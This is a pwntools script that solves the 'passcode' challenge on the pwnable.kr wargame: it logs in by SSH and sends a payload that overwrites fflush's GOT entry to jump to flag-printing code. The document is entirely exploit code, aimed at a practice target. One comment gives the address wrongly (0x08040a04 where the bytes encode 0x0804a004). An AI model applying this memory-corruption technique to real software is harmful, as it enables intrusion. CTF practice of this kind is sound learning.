#!/usr/bin/python

from pwn import *

sshPwnable = ssh(host="pwnable.kr", port=2222, user="passcode", password="guest")
process = sshPwnable.process(executable="./passcode", argv=["./passcode"])

fflush_got_plt ="\x04\xa0\x04\x08" # 0x08040a04 the address to re-write with system()
system_cat_flag = 0x080485d7 #the address of the function to write to

payload = 'a'*96 #someone gotta fill those 96 places
payload += fflush_got_plt
payload += str(int(system_cat_flag))

print(process.recvline(1024, timeout=1.0))
process.sendline(payload)

print(str(process.recvall()).replace('\\n', '\n'))
process.close()
